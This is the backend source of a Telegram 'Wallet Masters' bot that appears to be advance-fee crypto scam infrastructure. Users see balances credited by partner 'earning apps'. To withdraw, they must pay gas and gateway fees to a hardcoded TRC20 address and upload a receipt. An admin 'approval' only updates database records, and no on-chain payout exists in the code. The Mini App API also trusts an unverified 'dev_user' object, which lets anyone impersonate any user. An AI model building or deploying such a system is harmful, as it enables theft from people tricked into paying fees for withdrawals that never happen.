/**
 * Wallet Masters — Telegram Bot Backend
 * Node.js + node-telegram-bot-api + Express + SQLite
 * Admin Chat ID: 5995434559
 * Fee Address: TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ
 */

require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express     = require('express');
const cors        = require('cors');
const path        = require('path');

const {
  getOrCreateUser, getUserByTelegramId, getUserById,
  getEarningApps, addEarningApp,
  connectUID, getConnectedUID, getUserConnections,
  getUserTransactions, calculateFees,
  createWithdrawalRequest, getPendingWithdrawals,
  getWithdrawalById, updateWithdrawal, updateUserBalance,
  createTransaction, db
} = require('./database');

const BOT_TOKEN    = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const BOT_USERNAME  = process.env.BOT_USERNAME || 'WalletMastersBot';
const FEE_ADDRESS  = process.env.FEE_ADDRESS || 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const MINI_APP_URL = process.env.MINI_APP_URL || '';
const PORT         = process.env.PORT || 3000;

if (!BOT_TOKEN)    { console.error('❌ BOT_TOKEN missing in .env'); process.exit(1); }
if (!ADMIN_CHAT_ID){ console.error('❌ ADMIN_CHAT_ID missing in .env'); process.exit(1); }

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── Keyboards ────────────────────────────────────────────────────────────────

function mainMenu(miniAppUrl) {
  return {
    reply_markup: {
      keyboard: [
        [{ text: '💎 Open Wallet', web_app: { url: miniAppUrl || MINI_APP_URL } }],
        [{ text: '📋 My Transactions' }, { text: '🔗 Connect Earning App' }],
        [{ text: '🆔 My UID & Address' }, { text: '📞 Support' }]
      ],
      resize_keyboard: true
    }
  };
}

const adminMenu = {
  reply_markup: {
    keyboard: [
      [{ text: '📋 Pending Withdrawals' }, { text: '➕ Add Earning App' }],
      [{ text: '📱 List Earning Apps' },  { text: '💰 Fee Address' }],
      [{ text: '👥 User Stats' }]
    ],
    resize_keyboard: true
  }
};

function approveRejectKeyboard(wrId) {
  return {
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ APPROVE', callback_data: `approve_${wrId}` },
        { text: '❌ REJECT',  callback_data: `reject_${wrId}` }
      ]]
    }
  };
}

// ─── /start ──────────────────────────────────────────────────────────────────

bot.onText(/\/start/, async (msg) => {
  const { id, username, first_name, last_name } = msg.from;
  const fullName = [first_name, last_name].filter(Boolean).join(' ');
  const user = getOrCreateUser(id, username, fullName);
  const isAdmin = String(id) === String(ADMIN_CHAT_ID);

  const welcomeText = `
💎 *Welcome to Wallet Masters!*

Hello *${fullName}*! Your crypto wallet is ready.

━━━━━━━━━━━━━━━━━━━━
🆔 *Wallet UID:* \`${user.uid}\`
📬 *TRC20 Address:* \`${user.trc20_address}\`
💰 *USDT Balance:* \`${user.usdt_balance.toFixed(2)} USDT\`
━━━━━━━━━━━━━━━━━━━━

${MINI_APP_URL ? '👇 Tap below to open your wallet dashboard:' : '⚠️ Mini App URL not configured yet.'}
  `.trim();

  await bot.sendMessage(id, welcomeText, {
    parse_mode: 'Markdown',
    ...(isAdmin ? adminMenu : mainMenu())
  });
});

// ─── My Transactions ──────────────────────────────────────────────────────────

bot.onText(/📋 My Transactions/, async (msg) => {
  const user = getUserByTelegramId(msg.from.id);
  if (!user) return bot.sendMessage(msg.from.id, 'Please tap /start first.');

  const txs = getUserTransactions(user.id, 10);
  if (!txs.length) {
    return bot.sendMessage(msg.from.id, '📭 *No transactions yet.*\n\nDeposit USDT to your wallet to get started!', { parse_mode: 'Markdown' });
  }

  let text = '📋 *Recent Transactions*\n\n';
  txs.forEach((tx, i) => {
    const date = new Date(tx.created_at * 1000).toLocaleString();
    const icon = tx.type === 'deposit' ? '⬇️' : '⬆️';
    const statusIcon = { completed: '✅', pending: '⏳', approved: '✅', rejected: '❌', awaiting_fee: '💳', fee_paid: '🔍' }[tx.status] || '⏳';
    text += `${icon} *${tx.type.toUpperCase()}* · ${tx.amount} ${tx.currency || 'USDT'}\n`;
    text += `   ${statusIcon} ${tx.status.replace(/_/g,' ').toUpperCase()}\n`;
    if (tx.source_app) text += `   📱 From: ${tx.source_app}\n`;
    text += `   📅 ${date}\n`;
    text += `   🔗 \`${(tx.tx_hash || '').slice(0, 14)}...\`\n\n`;
  });

  bot.sendMessage(msg.from.id, text, { parse_mode: 'Markdown' });
});

// ─── My UID & Address ─────────────────────────────────────────────────────────

bot.onText(/🆔 My UID & Address/, async (msg) => {
  const user = getUserByTelegramId(msg.from.id);
  if (!user) return;

  bot.sendMessage(msg.from.id, `
🆔 *Your Wallet Details*

━━━━━━━━━━━━━━━━━━━━
📌 *Wallet UID:*
\`${user.uid}\`

📬 *TRC20 USDT Address:*
\`${user.trc20_address}\`

💰 *Balance:* ${user.usdt_balance.toFixed(2)} USDT
━━━━━━━━━━━━━━━━━━━━

Use your UID to receive earnings from connected apps.
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Connect Earning App (user) ───────────────────────────────────────────────

bot.onText(/🔗 Connect Earning App/, async (msg) => {
  const apps = getEarningApps();
  if (!apps.length) {
    return bot.sendMessage(msg.from.id, '📭 *No earning apps available yet.*\n\nCheck back soon — more apps are being verified!', { parse_mode: 'Markdown' });
  }

  const buttons = apps.map(a => ([{ text: `💰 ${a.name}`, callback_data: `connect_app_${a.id}` }]));
  bot.sendMessage(msg.from.id, '🔗 *Available Earning Apps*\n\nSelect an app to connect your UID:', {
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: buttons }
  });
});

// ─── Support ──────────────────────────────────────────────────────────────────

bot.onText(/📞 Support/, (msg) => {
  bot.sendMessage(msg.from.id, `
📞 *Wallet Masters Support*

For help with:
• Withdrawal issues
• Deposit delays  
• UID connection problems

Please describe your issue and we'll respond shortly.

🆔 Your Wallet UID: \`${getUserByTelegramId(msg.from.id)?.uid || 'N/A'}\`
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Admin: Pending Withdrawals ───────────────────────────────────────────────

bot.onText(/📋 Pending Withdrawals/, async (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const pending = getPendingWithdrawals();
  if (!pending.length) return bot.sendMessage(msg.from.id, '✅ No pending withdrawals at the moment.');

  await bot.sendMessage(msg.from.id, `📋 *${pending.length} Pending Withdrawal(s):*`, { parse_mode: 'Markdown' });
  for (const wr of pending) await sendWithdrawalToAdmin(wr);
});

// ─── Admin: List Earning Apps ─────────────────────────────────────────────────

bot.onText(/📱 List Earning Apps/, async (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const apps = getEarningApps();
  if (!apps.length) return bot.sendMessage(msg.from.id, '📭 No earning apps added yet.');

  let text = `📱 *Earning Apps (${apps.length})*\n\n`;
  apps.forEach(a => {
    text += `• *${a.name}* (ID: ${a.id})\n`;
    if (a.description) text += `  ${a.description}\n`;
    text += `  🔑 Token: \`${a.token.slice(0, 10)}...\`\n\n`;
  });
  bot.sendMessage(msg.from.id, text, { parse_mode: 'Markdown' });
});

// ─── Admin: Fee Address ───────────────────────────────────────────────────────

bot.onText(/💰 Fee Address/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  bot.sendMessage(msg.from.id, `💰 *Fee Collection Address (TRC20/USDT):*\n\n\`${FEE_ADDRESS}\`\n\nAll withdrawal fees are directed here.`, { parse_mode: 'Markdown' });
});

// ─── Admin: User Stats ────────────────────────────────────────────────────────

bot.onText(/👥 User Stats/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const total     = db.prepare('SELECT COUNT(*) as c FROM users').get().c;
  const txCount   = db.prepare('SELECT COUNT(*) as c FROM transactions').get().c;
  const pendingWr = db.prepare("SELECT COUNT(*) as c FROM withdrawal_requests WHERE status IN ('fee_paid','awaiting_fee')").get().c;
  const totalBal  = db.prepare('SELECT SUM(usdt_balance) as s FROM users').get().s || 0;

  bot.sendMessage(msg.from.id, `
👥 *Wallet Masters Stats*

━━━━━━━━━━━━━━━━━━━━
👤 Total Users: *${total}*
📊 Total Transactions: *${txCount}*
⏳ Pending Withdrawals: *${pendingWr}*
💰 Total Wallet Balances: *${totalBal.toFixed(2)} USDT*
━━━━━━━━━━━━━━━━━━━━
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Admin: Add Earning App flow ──────────────────────────────────────────────

const pendingActions = {}; // { userId: { step, data... } }

bot.onText(/➕ Add Earning App/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  pendingActions[msg.from.id] = { step: 'add_app_name' };
  bot.sendMessage(msg.from.id, '📱 *Add Earning App — Step 1/3*\n\nEnter the *name* of the Earning App:', {
    parse_mode: 'Markdown',
    reply_markup: { force_reply: true }
  });
});

// ─── General message handler ──────────────────────────────────────────────────

bot.on('message', async (msg) => {
  const uid  = msg.from.id;
  const text = msg.text || '';
  const action = pendingActions[uid];

  if (!action) return;

  // ── Admin Add App Flow ──
  if (action.step === 'add_app_name') {
    pendingActions[uid] = { step: 'add_app_token', name: text.trim() };
    return bot.sendMessage(uid,
      `✅ Name: *${text.trim()}*\n\n*Step 2/3:* Enter the Bot Token of this earning app:`,
      { parse_mode: 'Markdown' }
    );
  }

  if (action.step === 'add_app_token') {
    pendingActions[uid] = { step: 'add_app_desc', name: action.name, token: text.trim() };
    return bot.sendMessage(uid,
      `✅ Token saved.\n\n*Step 3/3:* Enter a short description (or type \`skip\`):`,
      { parse_mode: 'Markdown' }
    );
  }

  if (action.step === 'add_app_desc') {
    const desc = text.trim().toLowerCase() === 'skip' ? '' : text.trim();
    try {
      const newApp = addEarningApp(action.name, action.token, desc);
      delete pendingActions[uid];
      return bot.sendMessage(uid,
        `🎉 *Earning App Added Successfully!*\n\n📱 Name: *${newApp.name}*\n🆔 App ID: \`${newApp.id}\`\n📝 Desc: ${desc || 'N/A'}\n\nUsers can now connect to this app!`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      delete pendingActions[uid];
      return bot.sendMessage(uid, `❌ Error: ${e.message}\n\nToken may already exist.`);
    }
  }

  // ── User UID entry ──
  if (action.step === 'enter_uid') {
    const { appId, appName } = action;
    const externalUID = text.trim();
    const user = getUserByTelegramId(uid);

    if (!/^[a-zA-Z0-9_\-\.]{3,60}$/.test(externalUID)) {
      delete pendingActions[uid];
      return bot.sendMessage(uid,
        '❌ *Invalid UID!*\n\nThe UID you entered is not recognized. Please check and try again.',
        { parse_mode: 'Markdown' }
      );
    }

    connectUID(user.id, appId, externalUID);
    delete pendingActions[uid];

    return bot.sendMessage(uid,
      `✅ *Successfully Connected!*\n\n📱 App: *${appName}*\n🔑 Your UID: \`${externalUID}\`\n\nDeposits from this app will now arrive in your wallet instantly! 🚀`,
      { parse_mode: 'Markdown' }
    );
  }

  // ── Receipt photo for withdrawal ──
  if (action.step === 'awaiting_receipt') {
    if (!msg.photo && !msg.document) {
      return bot.sendMessage(uid, '📸 Please send a *screenshot/photo* of your payment receipt.', { parse_mode: 'Markdown' });
    }

    const fileId = msg.photo
      ? msg.photo[msg.photo.length - 1].file_id
      : msg.document.file_id;

    const { wrId } = action;
    updateWithdrawal(wrId, { receipt_file_id: fileId, status: 'fee_paid' });
    delete pendingActions[uid];

    const wr   = getWithdrawalById(wrId);
    const user = getUserByTelegramId(uid);

    await bot.sendMessage(uid, `
✅ *Payment Receipt Received!*

Your withdrawal request is now under review.
⏳ Estimated approval time: 1–24 hours.

📊 *Withdrawal Summary:*
💰 Amount: ${wr.amount} ${wr.currency}
🌐 Network: ${wr.network}
📬 To: \`${wr.to_address}\`
💸 Fee Paid: ${wr.total_fee} USDT

You'll be notified once approved. Thank you! 🙏
    `.trim(), { parse_mode: 'Markdown' });

    // ── Notify Admin ──
    const adminCaption = `
🔔 *FEE PAYMENT RECEIVED — Action Required*

👤 User: *${wr.full_name}* (@${wr.telegram_username || 'N/A'})
🆔 Wallet UID: \`${user.uid}\`
📱 Telegram ID: \`${wr.telegram_id}\`

━━━━━━━━━━━━━━━━━━━━
💰 Withdrawal: *${wr.amount} ${wr.currency}*
🌐 Network: *${wr.network}*
📬 To Address: \`${wr.to_address}\`
━━━━━━━━━━━━━━━━━━━━
⛽ Gas Fee: ${wr.gas_fee} USDT
🏦 Gateway Fee: ${wr.gateway_fee} USDT
💸 Total Fee Paid: *${wr.total_fee} USDT*
━━━━━━━━━━━━━━━━━━━━
🆔 Request ID: #${wr.id}
📅 Date: ${new Date().toLocaleString()}
    `.trim();

    await bot.sendPhoto(ADMIN_CHAT_ID, fileId, {
      caption: adminCaption,
      parse_mode: 'Markdown',
      ...approveRejectKeyboard(wr.id)
    });
  }
});

// ─── Callback Queries ─────────────────────────────────────────────────────────

bot.on('callback_query', async (query) => {
  const { id: queryId, data, from, message } = query;
  const uid = from.id;
  await bot.answerCallbackQuery(queryId);

  // ── Connect App (user) ──
  if (data.startsWith('connect_app_')) {
    const appId = parseInt(data.split('_')[2]);
    const apps  = getEarningApps();
    const app   = apps.find(a => a.id === appId);
    if (!app) return;

    const user     = getUserByTelegramId(uid);
    const existing = getConnectedUID(user.id, appId);

    if (existing) {
      return bot.sendMessage(uid,
        `ℹ️ Already connected to *${app.name}*\n\n🔑 Your UID: \`${existing.external_uid}\``,
        { parse_mode: 'Markdown' }
      );
    }

    pendingActions[uid] = { step: 'enter_uid', appId, appName: app.name };
    return bot.sendMessage(uid,
      `🔗 *Connecting to ${app.name}*\n\nEnter your *Unique UID* from ${app.name}:`,
      { parse_mode: 'Markdown', reply_markup: { force_reply: true } }
    );
  }

  // ── Pay Fee (user) ──
  if (data.startsWith('pay_fee_')) {
    const wrId = parseInt(data.split('_')[2]);
    const wr   = getWithdrawalById(wrId);
    if (!wr) return;

    pendingActions[uid] = { step: 'awaiting_receipt', wrId };

    await bot.sendMessage(uid, `
💳 *Fee Payment Instructions*

To process your withdrawal, please pay the fee:

━━━━━━━━━━━━━━━━━━━━
💰 Withdrawal: *${wr.amount} ${wr.currency}*
🌐 Network: *${wr.network}*
━━━━━━━━━━━━━━━━━━━━
⛽ Gas Fee: *${wr.gas_fee} USDT*
🏦 Gateway Fee: *${wr.gateway_fee} USDT*
💸 *Total to Pay: ${wr.total_fee} USDT*
━━━━━━━━━━━━━━━━━━━━

📬 *Send Payment To (TRC20):*
\`${FEE_ADDRESS}\`

✅ After paying, send your *payment screenshot* here.
    `.trim(), { parse_mode: 'Markdown' });
  }

  // ── Admin Approve ──
  if (data.startsWith('approve_')) {
    if (String(uid) !== String(ADMIN_CHAT_ID)) return;
    const wrId = parseInt(data.split('_')[1]);
    const wr   = getWithdrawalById(wrId);
    if (!wr) return bot.sendMessage(uid, '❌ Withdrawal not found.');

    updateWithdrawal(wrId, { status: 'approved' });
    const user = getUserById(wr.user_id);
    if (user && user.usdt_balance >= wr.amount) updateUserBalance(wr.user_id, -wr.amount);

    await bot.sendMessage(wr.telegram_id, `
✅ *Withdrawal Approved!*

Your withdrawal has been processed successfully.

━━━━━━━━━━━━━━━━━━━━
💰 Amount: *${wr.amount} ${wr.currency}*
🌐 Network: *${wr.network}*
📬 To: \`${wr.to_address}\`
━━━━━━━━━━━━━━━━━━━━

⏳ Allow 5–30 minutes for the transaction to appear on-chain.
Thank you for using *Wallet Masters!* 💎
    `.trim(), { parse_mode: 'Markdown' });

    await bot.editMessageCaption(
      `${message.caption}\n\n✅ *APPROVED* by Admin at ${new Date().toLocaleString()}`,
      { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' }
    ).catch(() => {});

    bot.sendMessage(uid, `✅ Withdrawal *#${wrId}* approved and user notified.`, { parse_mode: 'Markdown' });
  }

  // ── Admin Reject ──
  if (data.startsWith('reject_')) {
    if (String(uid) !== String(ADMIN_CHAT_ID)) return;
    const wrId = parseInt(data.split('_')[1]);
    const wr   = getWithdrawalById(wrId);
    if (!wr) return bot.sendMessage(uid, '❌ Withdrawal not found.');

    updateWithdrawal(wrId, { status: 'rejected' });

    await bot.sendMessage(wr.telegram_id, `
❌ *Withdrawal Rejected*

Your withdrawal request has been rejected.

━━━━━━━━━━━━━━━━━━━━
💰 Amount: ${wr.amount} ${wr.currency}
🆔 Request ID: #${wrId}
━━━━━━━━━━━━━━━━━━━━

If you believe this is an error, please contact support.
Your fee payment will be reviewed separately.
    `.trim(), { parse_mode: 'Markdown' });

    await bot.editMessageCaption(
      `${message.caption}\n\n❌ *REJECTED* by Admin at ${new Date().toLocaleString()}`,
      { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' }
    ).catch(() => {});

    bot.sendMessage(uid, `❌ Withdrawal *#${wrId}* rejected and user notified.`, { parse_mode: 'Markdown' });
  }
});

// ─── REST API ─────────────────────────────────────────────────────────────────

// Health check
app.get('/health', (req, res) => res.json({ status: 'ok', bot: BOT_USERNAME, ts: Date.now() }));

// Parse Telegram initData user (basic — production should verify HMAC)
function parseTgUser(initData) {
  try {
    const params = new URLSearchParams(initData);
    const userStr = params.get('user');
    return userStr ? JSON.parse(userStr) : null;
  } catch { return null; }
}

// POST /api/auth — Mini App login
app.post('/api/auth', (req, res) => {
  const { initData } = req.body;
  let tgUser = parseTgUser(initData);

  // Dev fallback: accept direct user object if no initData
  if (!tgUser && req.body.dev_user) tgUser = req.body.dev_user;
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });

  const user = getOrCreateUser(
    tgUser.id,
    tgUser.username,
    [tgUser.first_name, tgUser.last_name].filter(Boolean).join(' ')
  );

  const connections  = getUserConnections(user.id);
  const transactions = getUserTransactions(user.id, 20);
  const earningApps  = getEarningApps();

  res.json({
    success: true,
    user: {
      id: user.id,
      telegramId: user.telegram_id,
      name: user.full_name,
      username: user.telegram_username,
      uid: user.uid,
      trc20Address: user.trc20_address,
      balance: user.usdt_balance
    },
    connections,
    transactions,
    earningApps,
    feeAddress: FEE_ADDRESS,
    botUsername: BOT_USERNAME
  });
});

// GET /api/earning-apps
app.get('/api/earning-apps', (req, res) => {
  res.json({ apps: getEarningApps() });
});

// POST /api/withdraw
app.post('/api/withdraw', (req, res) => {
  const { initData, dev_user, toAddress, amount, currency, network } = req.body;
  let tgUser = parseTgUser(initData) || dev_user;
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });

  const user = getUserByTelegramId(tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const amt = parseFloat(amount);
  if (isNaN(amt) || amt <= 0) return res.json({ error: 'Invalid amount' });
  if (amt > user.usdt_balance) return res.json({ error: 'Insufficient balance' });
  if (!toAddress || toAddress.length < 20) return res.json({ error: 'Invalid address' });

  const { gasFee, gatewayFee, totalFee } = calculateFees(amt);
  const wr = createWithdrawalRequest({
    user_id: user.id,
    to_address: toAddress,
    network: network || 'TRC20',
    currency: currency || 'USDT',
    amount: amt,
    gas_fee: gasFee,
    gateway_fee: gatewayFee,
    total_fee: totalFee
  });

  // Notify user via bot with Pay Fee button
  bot.sendMessage(tgUser.id, `
⚠️ *Withdrawal Request Created — #${wr.id}*

💰 Amount: *${amt} ${currency || 'USDT'}*
🌐 Network: ${network || 'TRC20'}
📬 To: \`${toAddress}\`
💸 Total Fee: *${totalFee} USDT*

Tap below to pay the fee and complete your withdrawal:
  `.trim(), {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[{ text: '💳 Pay Fee Now', callback_data: `pay_fee_${wr.id}` }]]
    }
  }).catch(() => {});

  res.json({
    success: true,
    withdrawal: {
      id: wr.id, amount: amt,
      gasFee, gatewayFee, totalFee,
      feeAddress: FEE_ADDRESS,
      status: 'awaiting_fee'
    }
  });
});

// POST /api/connect-uid
app.post('/api/connect-uid', (req, res) => {
  const { initData, dev_user, appId, externalUID } = req.body;
  let tgUser = parseTgUser(initData) || dev_user;
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });

  const user = getUserByTelegramId(tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (!/^[a-zA-Z0-9_\-\.]{3,60}$/.test(externalUID)) {
    return res.json({ error: 'Invalid UID format', code: 'INVALID_UID' });
  }

  const apps = getEarningApps();
  const foundApp = apps.find(a => a.id === parseInt(appId));
  if (!foundApp) return res.json({ error: 'App not found' });

  connectUID(user.id, appId, externalUID);
  res.json({ success: true, connected: { app: foundApp.name, uid: externalUID } });
});

// POST /api/deposit — called by earning apps
app.post('/api/deposit', (req, res) => {
  const { app_token, external_uid, amount, currency, note } = req.body;
  if (!app_token || !external_uid || !amount) {
    return res.status(400).json({ error: 'Missing: app_token, external_uid, amount' });
  }

  const { getEarningAppByToken } = require('./database');
  const earningApp = getEarningAppByToken(app_token);
  if (!earningApp || !earningApp.is_active) {
    return res.status(403).json({ error: 'Invalid or inactive app token' });
  }

  const conn = db.prepare(`
    SELECT uc.*, u.id as user_id, u.telegram_id 
    FROM uid_connections uc
    JOIN users u ON u.id = uc.user_id
    WHERE uc.app_id = ? AND uc.external_uid = ?
  `).get(earningApp.id, external_uid);

  if (!conn) {
    return res.status(404).json({ error: 'UID not connected', code: 'INVALID_UID' });
  }

  const amt = parseFloat(amount);
  if (isNaN(amt) || amt <= 0) return res.status(400).json({ error: 'Invalid amount' });

  updateUserBalance(conn.user_id, amt);
  const tx = createTransaction({
    user_id: conn.user_id,
    type: 'deposit',
    amount: amt,
    currency: currency || 'USDT',
    network: 'TRC20',
    source_app: earningApp.name,
    source_uid: external_uid,
    status: 'completed'
  });

  // Instant notification
  bot.sendMessage(conn.telegram_id, `
💰 *Deposit Received!*

━━━━━━━━━━━━━━━━━━━━
✅ *+${amt} ${currency || 'USDT'}* credited
📱 From: *${earningApp.name}*
🔑 UID: \`${external_uid}\`
🔗 TX: \`${tx.tx_hash.slice(0, 16)}...\`
━━━━━━━━━━━━━━━━━━━━

Open your wallet to withdraw! 💎
  `.trim(), { parse_mode: 'Markdown' }).catch(() => {});

  res.json({ success: true, tx_hash: tx.tx_hash, credited: amt, currency: currency || 'USDT' });
});

// Serve Mini App for any unmatched GET (SPA fallback)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// ─── Start ────────────────────────────────────────────────────────────────────

async function sendWithdrawalToAdmin(wr) {
  const caption = `
🔔 *WITHDRAWAL REQUEST #${wr.id}*

👤 *${wr.full_name}* (@${wr.telegram_username || 'N/A'})
🆔 UID: \`${wr.wallet_uid}\`
📊 Status: *${wr.status.replace(/_/g,' ').toUpperCase()}*

━━━━━━━━━━━━━━━━━━━━
💰 *${wr.amount} ${wr.currency}*
🌐 Network: ${wr.network}
📬 To: \`${wr.to_address}\`
━━━━━━━━━━━━━━━━━━━━
⛽ Gas Fee: ${wr.gas_fee} USDT
🏦 Gateway Fee: ${wr.gateway_fee} USDT
💸 Total Fee: *${wr.total_fee} USDT*
  `.trim();

  if (wr.receipt_file_id) {
    await bot.sendPhoto(ADMIN_CHAT_ID, wr.receipt_file_id, {
      caption, parse_mode: 'Markdown', ...approveRejectKeyboard(wr.id)
    });
  } else {
    await bot.sendMessage(ADMIN_CHAT_ID, caption, {
      parse_mode: 'Markdown', ...approveRejectKeyboard(wr.id)
    });
  }
}

app.listen(PORT, () => {
  console.log(`🚀 Wallet Masters running on port ${PORT}`);
  console.log(`🤖 Bot: @${BOT_USERNAME}`);
  console.log(`👤 Admin ID: ${ADMIN_CHAT_ID}`);
  console.log(`💰 Fee Address: ${FEE_ADDRESS}`);
  console.log(`📱 Mini App: ${MINI_APP_URL || '⚠️  Not set — update MINI_APP_URL'}`);
});
